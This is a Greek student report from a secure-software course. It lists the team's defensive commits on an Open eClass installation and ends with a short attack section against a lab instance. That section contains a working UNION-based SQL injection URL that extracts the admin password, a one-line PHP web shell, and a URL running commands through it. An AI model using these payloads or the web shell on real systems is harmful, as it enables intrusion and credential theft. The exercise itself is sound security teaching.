Ανάπτυξη Αξιόπιστου και Ασφαλούς Λογισμικού  
Ομάδα: **Pappabakaliatis**  
Ημ/νία: 06/05/2020  

## 1. Άμυνα
#### 1.1 SQL Injection Prevention  
Αρχικά, ελέγξαμε τα σημεία στα οποία ενδεχομένως ήδη γίνεται κάποιο (έστω και μερικώς αναποτελεσματικό) SQL injection prevention. Αφότου βρήκαμε την `escapeSimple()` και διερευνήσαμε ποιες από τις σχετικές μεθόδους που καλούνται όντως υπάρχουν, ανανεώσαμε τη μέθοδο με σκοπό να γίνονται escape πάντοτε οι επικίνδυνοι χαρακτήρες για την SQL. Στη συνέχεια, εντοπίσαμε όλα τα σημεία εκείνα στα οποία ένα injection θα ήταν δυνατό, και καλέσαμε την `escapeSimple()` στις μεταβλητές εισόδου. Ενδεικτικά, αυτό έχει πραγματοποιηθεί στα εξής commits:

* Δημιουργία χρήστη
    -	https://github.com/ChrisPapp/defend-eclass/commit/438b2cf6dae184a5aae76d3ad1307f4c28af9411
    -	https://github.com/ChrisPapp/defend-eclass/commit/f8df871ce6c17de85a3cf78c8faf91e3e1663a01
*	Περιοχές συζητήσεων  
    - https://github.com/ChrisPapp/defend-eclass/commit/1b2baec5f0d9c453949e356a75806a861246cad9
    -	https://github.com/ChrisPapp/defend-eclass/commit/4d6a5f1efdede2f448332b66cf6e25858c246085
    -	https://github.com/ChrisPapp/defend-eclass/commit/2536a9a9943faf4431cc74de00758424de4e2e23
*	Εργασίες
    -	https://github.com/ChrisPapp/defend-eclass/commit/af417db8cef9dcba0953dda33b062e121efd1e61
    -	https://github.com/ChrisPapp/defend-eclass/commit/59c24ed6a61fd8dfc221096b1a4a93f21ad63a2a
*	Επεξεργασία προφίλ
    -	https://github.com/ChrisPapp/defend-eclass/commit/8d4cf72c3b6d41f0b40ffdc20456a7ad63835ac0
*	Εγγραφή σε/Απεγγραφή από μάθημα
    -	https://github.com/ChrisPapp/defend-eclass/commit/47735fc0eb423e283698304fa51adc4e95d84f11
    -	https://github.com/ChrisPapp/defend-eclass/commit/2dabc608a020dc5c0911dff445574090c6129724
*	Ανταλλαγή αρχείων
    -	https://github.com/ChrisPapp/defend-eclass/commit/70205cb9276f427cc5f380e9a1b824e85ccab477
    - https://github.com/ChrisPapp/defend-eclass/commit/9c6dd4895e44535f19f3b220b6aefcb518b0c71c  

Φυσικά, σε κάποια σημεία γινόταν ήδη χρήση της escapeSimple(), οπότε και με τη δική μας βελτίωση λειτουργούν και αυτά σωστά. Αυτά τα σημεία δεν αναφέρονται στην παραπάνω λίστα.

#### 1.2 XSS Prevention  
Στο πλαίσιο του XSS prevention, δημιουργήθηκε μία συντόμευση `q()` για την `htmlspecialchars()`, η οποία περιλαμβάνει το flag `ENT_QUOTES` (στο include/lib/main.lib.php), απλώς για λόγους μεγαλύτερης ευελιξίας και ταχύτητας κατά την εκτέλεση της άμυνας. Όπου, λοιπόν, βρίσκετε τη σχετική κλήση της `q()` πρόκειται για XSS prevention. Μετατροπές έχουν πραγματοποιηθεί στα εξής commits:

*	Δημιουργία/Είσοδος χρήστη
    -	https://github.com/ChrisPapp/defend-eclass/commit/844a4cd867e98458150d5287b18a7bceedbd70d3
*	Αναζήτηση
    -	https://github.com/ChrisPapp/defend-eclass/commit/b8af85ca2594fa373fc105cda6290a84c9982106
*	Εργασίες
    -	https://github.com/ChrisPapp/defend-eclass/commit/af417db8cef9dcba0953dda33b062e121efd1e61 (αλλαγή και της `replace_dangerous_char()` με σκοπό να αντικαθιστά και την απόστροφο)
    -	https://github.com/ChrisPapp/defend-eclass/commit/a3150c65996fcaf20b92e85bef3ecb3771fba406
*	Τηλεσυνεργασία
    -	https://github.com/ChrisPapp/defend-eclass/commit/600124cb8a677bf318fcc6e60293efe92f15c5d4
*	Περιοχές συζητήσεων
    -	https://github.com/ChrisPapp/defend-eclass/commit/1b2baec5f0d9c453949e356a75806a861246cad9
    -	https://github.com/ChrisPapp/defend-eclass/commit/2536a9a9943faf4431cc74de00758424de4e2e23
    -	https://github.com/ChrisPapp/defend-eclass/commit/0ca238ef9779b80ead74c5e8dc459e3a9de3f7db
*	Εγγραφή σε/Απεγγραφή από μάθημα
    -	https://github.com/ChrisPapp/defend-eclass/commit/2dabc608a020dc5c0911dff445574090c6129724
    -	https://github.com/ChrisPapp/defend-eclass/commit/23c0d67c7ce26b8fc2feaab02765cfe74308bf3d
*	Διαχείριση χρηστών από admin
    -	https://github.com/ChrisPapp/defend-eclass/commit/85d388c858a92ca1270bddff6dc1f1b4ba3d8bd7
*	Ανταλλαγή αρχείων
    -	https://github.com/ChrisPapp/defend-eclass/commit/70205cb9276f427cc5f380e9a1b824e85ccab477
*	Επεξεργασία προφίλ
    -	https://github.com/ChrisPapp/defend-eclass/commit/8d4cf72c3b6d41f0b40ffdc20456a7ad63835ac0

#### 1.3 CSRF
Χρησιμοποιώντας τη βιβλιοθήκη paragonie/random_compat δημιουργήσαμε τη μέθοδο `generate_csrf_token()` (include/lib/main.lib.php). Όπου υπάρχει φόρμα, γίνεται validation του session token με τη μέθοδο `validate_token()` (η οποία περιέχει και πανέμορφη τρολιά για τους _επίδοξους_ χάκερς μας). Αποτροπή επιθέσεων CSRF γίνεται στα εξής commits:

*	Δημιουργία token και προσθήκη βιβλιοθήκης
    -	https://github.com/ChrisPapp/defend-eclass/commit/2d8ee019a96c98afc7f0085a07832a0f58151145
*	Υλοποίηση validation
    -	https://github.com/ChrisPapp/defend-eclass/commit/2cf67e9f38715eda5cfb0ab8982ca0546cab7ac8
*	Επεξεργασία προφίλ
    -	https://github.com/ChrisPapp/defend-eclass/commit/666fd8381793f6e32ac277e7f7316275e40abcf0 (η πιθανότητα να ξεκινάει ένας 40ψήφιος [commit's SHA] με τον συγκεκριμένο 3ψήφιο και να μην εμφανίζεται κάπου αλλού είναι `p=0.00000642475`, αν δεν έχουμε ξεχάσει τελείως τις πιθανότητες που ξέραμε, οπότε παρακαλούμε να συνεκτιμηθεί)
*	Τηλεσυνεργασία
    -	https://github.com/ChrisPapp/defend-eclass/commit/9ee686450e60f4a4342f70616ba1e7053096e967
    -	https://github.com/ChrisPapp/defend-eclass/commit/d04b259c673bece0c287645769f4bbb2952c25df
*	Διαχείριση χρηστών από admin
    -	https://github.com/ChrisPapp/defend-eclass/commit/3006dbeccda78fd919f7d1beaec01e602b20c999
*	Διαγραφή, επεξεργασία και ανανέωση μαθήματος
    -	https://github.com/ChrisPapp/defend-eclass/commit/de79153f367ca63e16d335ca5826b35143fcfcdf
*	Δημιουργία guest χρήστη
    -	https://github.com/ChrisPapp/defend-eclass/commit/b3a3484e58cce9a6a1eba240b98f3b1f99e61542
*	Προσθήκη πολλαπλών χρηστών
    -	https://github.com/ChrisPapp/defend-eclass/commit/1bad45e49c393fd28d337afc4b89c96b630b2999

#### 1.4 RFI prevention
Λόγω πίεσης χρόνου και αδυναμίας παραμετροποίησης των ρυθμίσεων του server, εδώ περιοριστήκαμε στο να μπλοκάρουμε τα αρχεία .php όπου επιτρέπεται το ανέβασμα αρχείου και στο καλύτερο randomization του τυχαίου path όπου αυτά αποθηκεύονται, ώστε να είναι δυσκολότερη ή και αδύνατη η εκτέλεσή τους.  
Commits: https://github.com/ChrisPapp/defend-eclass/commit/a9a4cddde89282fb11d7719ddae52ce1bba8abc6, https://github.com/ChrisPapp/defend-eclass/commit/b2dbfe63332ad22a1f907df2006f9604dc9c235a.
Τέλος, έγινε hashing στο όνομα του αρχείου του chat της τηλεσυνεργασίας ώστε να μην μπορεί να το εμφανίσει κάποιος κάνοντας get request στο ανάλογο path.

## 2. Επιθέσεις
*	Αρχικά υποκλέψαμε τον κωδικό με SQL injection: http://cookies_garo_kai_crackaro.csec.gr/modules/phpbb/viewtopic.php?topic=320582)%20%20UNION%20SELECT%20username,%20password%20FROM%20eclass.user%20WHERE%20user_id=1/*&forum=1
*	Στη συνέχεια έγινε αποστολή εργασίας με .php αρχείο με περιεχόμενο
```php
<?php 
	echo system($_GET['cmd']);
?>
```
  βρήκαμε το secret directory όπου αυτό αποθηκεύεται με ένα ακόμα request: http://cookies_garo_kai_crackaro.csec.gr/modules/phpbb/viewtopic.php?topic=69)%20UNION%20SELECT%20id,%20secret_directory%20FROM%20assignments/*&forum=1
  και αποκτήσαμε τη δυνατότητα να τρέξουμε όποια commands θέλουμε, όπως: http://cookies_garo_kai_crackaro.csec.gr/courses/TMA101/work/5ea49d7f31ae3/Hacker%20Your%208170105.php?cmd=pwd
*	Στην εργασία που αναφέρθηκε προηγουμένως έγινε και XSS επίθεση στο σχόλιο που τη συνοδεύει, όπως φαίνεται και στις διαφάνειες του μαθήματος.

Επειδή η εφαρμογή έχει πέσει, για να δουλέψουν τα παραπάνω, θα πρέπει να ξανανέβει και να δοκιμαστούν στην πράξη.

Forever yours,
οι Pappabakaliatis σας.
